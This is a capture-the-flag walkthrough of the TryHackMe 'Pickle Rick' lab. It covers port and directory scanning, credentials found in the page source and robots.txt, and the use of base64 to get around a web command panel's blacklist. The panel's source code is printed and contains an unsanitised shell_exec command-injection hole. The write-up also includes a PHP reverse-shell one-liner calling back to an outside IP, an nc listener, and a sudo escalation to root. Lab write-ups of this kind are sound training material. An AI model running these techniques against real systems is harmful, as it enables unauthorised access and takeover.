---
title: "THM - Picke Rick"
author: NiBi
lang: "en"
categories : ['Try Hack Me']
tags : ['CTF', 'THM','easy']
titlepage: true
toc: true
toc-own-page: true
---


# Nmap
As always, we start by scanning all opened ports with nmap

```Shell
└─$ nmap -A 10.10.164.56     
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 14:14 EDT
Nmap scan report for 10.10.164.56
Host is up (0.39s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ab:c3:10:24:d6:f4:ca:55:b0:05:5e:87:64:7f:9e:6e (RSA)
|   256 bc:a3:39:f2:c7:88:80:1b:eb:1d:59:02:8a:dd:b2:3e (ECDSA)
|_  256 bd:01:ce:77:8f:1b:93:dd:b3:c4:0d:40:15:05:1b:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds             
```

Opened ports :

* **22**
* **80**

##  Port 80

I've found in the source code of index.php :

```shell
 <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->
```

One user is : "R1ckRul3s"


Let's launch dirseach to find hidden directories/pages.

```shell
 └─$ dirsearch -u http://10.10.164.56 
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/10.10.164.56/_22-06-01_14-15-57.txt

Error Log: /home/kali/.dirsearch/logs/errors-22-06-01_14-15-57.log

Target: http://10.10.164.56/

[14:15:57] Starting: 
[14:16:16] 200 -    2KB - /assets/                                         
[14:16:28] 200 -    1KB - /index.html                                       
[14:16:31] 200 -  882B  - /login.php                                        
[14:16:41] 200 -   17B  - /robots.txt                                       
                              
Task Completed    
```

Nothing in assets

But we have a login.php page.

I tried several SQL injections but none succeeded

The robots.txt file contains "Wubbalubbadubdub".
I don't know what's the meaning of that but i kept it aside.

#### Logged in

Simple : "Wubbalubbadubdub" is just the R1ckRul3s password.

When we are logged we access to portal.php wich contains a textbox where we are able to enter commands.

In the source code we get "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0=="

Use shell to decode this base64 encoding...

```shell
 ➜  ~ echo "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d
VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=base64: entrée incorrecte
➜  ~ echo "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d  
VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=base64: entrée incorrecte
➜  ~ echo "VmpGU1NtVkdTWGxTYkdScFUwWktjRlZyVmt0VE1WWnhVMjA1VG1KSGVIbFhhMXBoVlZaV1ZVMUVhejA=" | base64 -d
VjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0       
➜  ~ echo "VjFSSmVGSXlSbGRpU0ZKcFVrVktTMVZxU205TmJHeHlXa1phVVZWVU1Eaz0" | base64 -d
V1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=base64: entrée incorrecte
➜  ~ echo "V1RJeFIyRldiSFJpUkVKS1VqSm9NbGxyWkZaUVVUMDk=" | base64 -d
WTIxR2FWbHRiREJKUjJoMllrZFZQUT09%                                              
➜  ~ echo "WTIxR2FWbHRiREJKUjJoMllrZFZQUT09" | base64 -d            
Y21GaVltbDBJR2h2YkdVPQ==                                                       
➜  ~ echo "Y21GaVltbDBJR2h2YkdVPQ==" | base64 -d        
cmFiYml0IGhvbGU=%                                                              
➜  ~ echo "cmFiYml0IGhvbGU=" | base64 -d
rabbit hole        
➜  ~ 
```

When we decode a string we get another encoded string until we have this message : "rabbit hole", well...

Entering "ls" in the portal.php text box, the output is

```shell
ls 
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

if we make "cat Sup3rS3cretPickl3Ingred.txt" we can't because the cat command is banned

We can bypass the banning mechanism thanks to "base64" command

We can print file content by using base64 command and we decode the content in our machine

```shell
➜  ~ base64 Sup3rS3cretPickl3Ingred.txt
[first flag]
```

We make the same for login.php to see what are banned commands

```shell
➜  ~ base64 login.php
PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKaWYoJF9TRVNTSU9OWyJsb2dpbiJdID09IGZhbHNlKSB7
CiAgIGhlYWRlcigiTG9jYXRpb246IC9sb2dpbi5waHAiKTsgZGllKCk  [...too long..]  saVJtaG9UVmhDYjFac1dt
RldNVnBXVFZWV2FHVnFRVDA9PSAtLT4KICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
```

Decoded content 

```Shell
  <?php
session_start();

if($_SESSION["login"] == false) {
   header("Location: /login.php"); die();
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>
  <nav class="navbar navbar-inverse">
    <div class="container">
      <div class="navbar-header">
        <a class="navbar-brand" href="#">Rick Portal</a>
      </div>
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Commands</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Creatures</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Beth Clone Notes</a></li>
      </ul>
    </div>
  </nav>

  <div class="container">
    <form name="input" action="" method="post">
      <h3>Command Panel</h3></br>
      <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
      <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
    </form>
    <?php
      function contains($str, array $arr)
      {
          foreach($arr as $a) {
              if (stripos($str,$a) !== false) return true;
          }
          return false;
      }
      // Cant use cat
      $cmds = array("cat", "head", "more", "tail", "nano", "vim", "vi");
      if(isset($_POST["command"])) {
        if(contains($_POST["command"], $cmds)) {
          echo "</br><p><u>Command disabled</u> to make it hard for future <b>PICKLEEEE RICCCKKKK</b>.</p><img src='assets/fail.gif'>";
        } else {
          $output = shell_exec($_POST["command"]);
          echo "</br><pre>$output</pre>";
        }
      }

    ?>
    <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
  </div>
</body>
</html>
```
banned command are :
* cat 
* head 
* more
* tail
* nano
* vim
* vi

We can't directly print file content (we have to encode it with base64) but we can certainly start a reverse shell 


```shell
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Listener : 

```shell
└─$ nc -lvp 1234
listening on [any] 1234 ...
10.10.164.56: inverse host lookup failed: Unknown host
connect to [10.8.80.139] from (UNKNOWN) [10.10.164.56] 52060                             
┌──(kali㉿kali)-[~]
└─$ 
```

I tried sooo much reverse shell but none worked... The connection was always closed after it was established

So, let's forget reverse shell and continue enumeration.

If we enumerate much we discover /home/rick/

Let's cat the file in the rick's home directory and decode it 

```shell
use 
└─$ echo "MSBqZXJyeSB0ZWFoCg==" | base64 -d
[second flag]
```

Output of **sudo -l** :
```shell
 Matching Defaults entries for www-data on ip-10-10-164-56.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-164-56.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

So, we can run ANY command as root ? 

Perfect !   

By adding sudo before each command we can access all files on the system...

### The third flag

```shell
┌──(kali㉿kali)-[~]
└─$ sudo ls -l /root/
3rd.txt
snap    
```

As before, we use base64 to read files 

```shell
┌──(kali㉿kali)-[~]
└─$ sudo base64 -d 3rd.txt
[third flag]
```

Done !
